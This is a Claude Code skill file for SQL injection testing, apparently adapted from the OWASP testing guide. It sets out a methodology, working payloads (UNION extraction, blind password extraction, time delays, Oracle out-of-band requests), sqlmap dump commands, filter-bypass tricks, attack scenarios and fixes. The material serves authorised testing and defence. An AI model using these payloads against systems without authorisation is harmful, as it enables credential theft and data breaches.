---
name: sql-injection
description: >
  SQL injection occurs when untrusted user input is interpolated directly into database queries, allowing attackers to alter query logic. Detect via single-quote errors, boolean-based blind responses (AND 1=1 vs AND 1=2), time-delay payloads (SLEEP, WAITFOR), UNION column enumeration, and error messages from MySQL, Oracle, MSSQL, PostgreSQL. Tools: sqlmap, sqlbftools, Burp Suite, wfuzz with SQLi fuzz strings.
license: MIT
compatibility: Designed for Claude Code. Requires curl, sqlmap (optional), Burp Suite or OWASP ZAP.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-05
---

# SQL Injection

## What Is Broken and Why
SQL injection arises when applications build SQL queries by concatenating user-controlled strings without parameterization or proper escaping. An attacker who controls part of the query can change its semantics — bypassing authentication, extracting data via UNION or blind techniques, writing files, or executing operating-system commands through database-specific features (xp_cmdshell, UTL_HTTP). The root cause is treating data as code.

## Key Signals
- Single quote `'` or semicolon `;` in a parameter returns a database error or anomalous response
- `AND 1=1` returns normal content; `AND 1=2` returns empty/different content
- Error messages referencing MySQL, ORA-, MSSQL, PostgreSQL syntax
- `ORDER BY N--` incrementing until an error reveals column count
- Delayed response to `SLEEP(5)` or `WAITFOR DELAY '0:0:5'`
- Application encodes or strips `'` but not `--` or `/**/`

## Methodology
1. Enumerate all input vectors: GET/POST parameters, cookie values, HTTP headers (User-Agent, Referer, X-Forwarded-For).
2. Submit `'`, `"`, `;`, `--`, `/* */` individually and observe response differences (errors, blank pages, changed content).
3. Confirm with boolean pair: append `AND 1=1--` (true) vs `AND 1=2--` (false).
4. Determine column count with `ORDER BY 1--`, incrementing until error.
5. Find injectable columns with `UNION SELECT null,null,...--` substituting `null` with `1` or `'a'` to locate string columns.
6. Extract data: `UNION SELECT table_name,null FROM information_schema.tables--`
7. For blind (no output): use ASCII/SUBSTRING boolean loop or time-delay payloads.
8. For error-based (Oracle): use `UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))`.
9. Test stacked queries where supported: `; INSERT INTO ...`.
10. Escalate to OS interaction if database user has sufficient privileges.

## Payloads & Tools
```
# Boolean detection
TARGET/page?id=1 AND 1=1--
TARGET/page?id=1 AND 1=2--

# Column count
TARGET/page?id=10 ORDER BY 5--

# UNION extraction (3-column example)
TARGET/page?id=99999 UNION SELECT 1,version(),3--
TARGET/page?id=99999 UNION SELECT 1,table_name,3 FROM information_schema.tables LIMIT 1--

# Boolean blind character extraction
TARGET/page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--

# Time-based blind (MySQL)
TARGET/page?id=1 AND IF(1=1,SLEEP(5),0)--

# Time-based blind (MSSQL)
TARGET/page?id=1; WAITFOR DELAY '0:0:5'--

# Error-based (Oracle)
TARGET/page?id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--

# Out-of-band (Oracle)
TARGET/page?id=10||UTL_HTTP.REQUEST('VICTIM:80'||(SELECT user FROM DUAL))--

# sqlmap automation
sqlmap -u "TARGET/page?id=1" --dbs --batch
sqlmap -u "TARGET/page?id=1" -D dbname --tables --batch
sqlmap -u "TARGET/page?id=1" -D dbname -T users --dump --batch
sqlmap -u "TARGET/page?id=1" --data="user=foo&pass=bar" --level=3 --risk=2
```

## Bypass Techniques
- Whitespace substitution: `OR/**/1=1`, `OR\n1=1`, `OR\t1=1`
- Comment fragmentation: `UN/**/ION/**/SE/**/LECT`
- Null byte prefix: `%00' UNION SELECT ...`
- URL encoding: `%27` for `'`, `%20` for space, `%2D%2D` for `--`
- Double URL encoding: `%2527` → `%27` → `'`
- Hex encoding: `SELECT user FROM users WHERE name=unhex('61646d696e')`
- `char()` encoding: `char(97,100,109,105,110)` = "admin"
- Case variation: `SeLeCt`, `uNiOn`
- MSSQL string concat: `EXEC('SEL'+'ECT 1')`
- Alternative boolean expressions: `OR 'x'='x'`, `OR 2>1`, `1||1=1`, `1&&1=1`, `OR 2 BETWEEN 1 AND 3`
- HTTP Parameter Pollution: split payload across duplicate parameters

## Exploitation Scenarios
**Scenario 1 — Authentication Bypass**
Setup: Login form passes username/password directly into `SELECT * FROM users WHERE user='$u' AND pass='$p'`.
Trigger: Submit username `admin'--` with any password. Query becomes `WHERE user='admin'--' AND pass='...'`, commenting out the password check.
Impact: Full admin account access without valid credentials.

**Scenario 2 — Data Exfiltration via UNION**
Setup: Product search page reflects one database field; column count is 3; column 2 is a string.
Trigger: `TARGET/search?q=x' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--`
Impact: All username/password hashes returned in the product name field.

**Scenario 3 — Blind Time-Based Credential Extraction**
Setup: No visible output; application returns 200 for all responses.
Trigger: `TARGET/page?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--` — iterate characters observing latency.
Impact: Full password hash extraction character by character.

## False Positives
- Apostrophes in legitimate product names causing syntax errors unrelated to injection
- Slow queries caused by missing indexes, not SLEEP payloads
- Generic 500 errors on all invalid input (not SQL-specific)
- WAF-generated error pages that mimic database errors

## Fix Patterns
- Parameterized queries / prepared statements in all database interactions: `SELECT * FROM users WHERE id = ?`
- ORM usage with no raw string interpolation
- Stored procedures with typed parameters (not dynamic SQL within the procedure)
- Input validation as defense-in-depth (not sole protection)
- Least-privilege database accounts (no xp_cmdshell, no FILE privilege)
- Disable detailed database error messages in production

## Related Skills

[[cmd-injection]] is the OS-level equivalent — both share the same root cause of treating input as code, and both can be tested with similar blind time-delay probes. When SQL injection on a login form bypasses authentication, that outcome is also covered in [[auth-bypass]]. If SQLi leads to file read (`LOAD_FILE`), [[path-traversal]] techniques apply for target file selection. In mobile apps, [[mobile-code-quality]] covers the same SQLite injection pattern against local databases.
